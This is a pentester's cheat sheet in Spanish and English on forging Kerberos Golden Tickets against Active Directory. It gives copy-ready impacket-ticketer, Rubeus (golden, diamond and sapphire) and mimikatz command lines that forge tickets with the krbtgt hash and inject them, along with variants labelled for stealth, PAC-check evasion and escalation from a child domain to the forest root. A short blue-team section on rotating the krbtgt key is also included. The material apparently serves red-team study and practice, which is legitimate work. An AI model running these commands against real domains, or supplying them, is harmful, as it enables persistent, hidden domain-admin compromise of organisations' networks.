---
aliases:
  - Golden Ticket Tools
  - impacket-ticketer
  - Rubeus golden
tags:
  - type/tool
  - technique/persistence
  - technique/kerberos
  - env/windows
  - env/linux
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[Golden Ticket]]'
---

# Golden Ticket - Tooling

***

## impacket-ticketer

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketer -nthash HASH -domain-sid SID -domain corp.local administrator` | Forge RC4 | Standard. |
| `impacket-ticketer -aesKey AES256 -domain-sid SID -domain corp.local administrator` | Forge AES256 | OPSEC. |
| `impacket-ticketer ... -user-id 500 -groups 513,512,520,518,519` | Con RID y groups | Completo. |
| `impacket-ticketer ... -extra-sid PARENT_SID-519` | SID History cross-domain | Child → forest root. |
| `impacket-ticketer ... -duration 600` | Lifetime 600h (25d) | Custom. |
^gt-tool-ticketer

```bash
# Full OPSEC forge
impacket-ticketer \
  -aesKey AES256KRBTGTHASH \
  -domain-sid S-1-5-21-... \
  -domain corp.local \
  -user-id 500 \
  -groups 513,512,520,518,519 \
  -duration 600 \
  administrator

export KRB5CCNAME=administrator.ccache
```

___

## impacket-lookupsid (Domain SID)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-lookupsid corp/admin:pass@DC 0` | Domain SID (RID 0 = domain itself) | Pre-forge. |
| `impacket-lookupsid corp/admin:pass@DC 0 \| grep -i "domain sid"` | Solo SID | Clean parse. |
| `impacket-lookupsid -hashes :NT corp/admin@DC 0` | Con PtH | Sin password. |
^gt-tool-lookupsid

```bash
impacket-lookupsid corp.local/administrator:'P@ssw0rd'@dc01.corp.local 0
# [*] Domain SID is: S-1-5-21-1234567890-987654321-111222333
```

___

## Rubeus golden / diamond / sapphire

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe golden /rc4:HASH /user:admin /id:500 /domain:d /sid:SID /ptt` | Golden RC4 + inject | Standard. |
| `Rubeus.exe golden /aes256:HASH /user:admin /id:500 /domain:d /sid:SID /ptt /opsec` | Golden AES256 OPSEC | Stealth. |
| `Rubeus.exe diamond /tgtdeleg /ticketuser:admin /ticketuserid:500 /groups:512 /krbkey:AES /ptt` | Diamond — PAC legítimo | Evade PAC check. |
| `Rubeus.exe sapphire /user:admin /aes256:AES /dc:DC /ptt` | Sapphire — ticket real | Máximo stealth. |
| `Rubeus.exe golden ... /outfile:golden.kirbi` | Sin inject — guardar | Para transfer. |
^gt-tool-rubeus

```powershell
# Golden OPSEC
.\Rubeus.exe golden /aes256:AES256HASH /user:administrator /id:500 `
  /domain:corp.local /sid:S-1-5-21-... /groups:512,513,520,518,519 `
  /endin:600 /renewmax:10080 /ptt /opsec

# Diamond (si PAC validation activo)
.\Rubeus.exe diamond /tgtdeleg /ticketuser:administrator /ticketuserid:500 `
  /groups:512 /krbkey:AES256KRBTGTHASH /ptt
```

___

## mimikatz kerberos::golden

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `kerberos::golden /user:admin /domain:d /sid:SID /krbtgt:HASH /ptt` | Forge + inject básico | On-host. |
| `kerberos::golden /user:admin /domain:d /sid:SID /aes256:HASH /ptt` | AES256 | OPSEC. |
| `kerberos::golden /user:admin /domain:d /sid:SID /krbtgt:HASH /id:500 /groups:512,513,520,518,519 /ptt` | Completo | Full. |
| `kerberos::golden /user:admin /domain:d /sid:SID /krbtgt:HASH /startoffset:-5 /endin:600 /renewmax:10080 /ptt` | Lifetime realista | OPSEC. |
^gt-tool-mimi

```
mimikatz # kerberos::purge
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-... /aes256:AES256HASH /id:500 /groups:512,513,520,518,519 /endin:600 /ptt
```

___

## New-KrbtgtKeys.ps1 (Blue Team)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `.\New-KrbtgtKeys.ps1 -Mode WhatIf` | Preview — sin cambios | Pre-rotation check. |
| `.\New-KrbtgtKeys.ps1 -Mode Reset` | Reset 1 — invalida tickets activos | Post-incident paso 1. |
| `# Esperar 12h para replicación AD` | — | Replicación inter-DC. |
| `.\New-KrbtgtKeys.ps1 -Mode Reset` | Reset 2 — invalida Golden Tickets | Post-incident paso 2. |
^gt-tool-krbtgt

```powershell
# https://github.com/microsoft/New-KrbtgtKeys.ps1
.\New-KrbtgtKeys.ps1 -Mode Reset
Start-Sleep -Seconds 43200  # 12h
.\New-KrbtgtKeys.ps1 -Mode Reset
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| impacket-ticketer | `https://github.com/fortra/impacket` |
| Rubeus | `https://github.com/GhostPack/Rubeus` |
| New-KrbtgtKeys.ps1 | `https://github.com/microsoft/New-KrbtgtKeys.ps1` |
| HackTricks — Golden Ticket | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket` |
| ADSecurity — Golden Ticket | `https://adsecurity.org/?p=1640` |
| The Hacker Recipes — GT | `https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden` |
| MITRE ATT&CK T1558.001 | `https://attack.mitre.org/techniques/T1558/001/` |
^gt-tool-resources

***
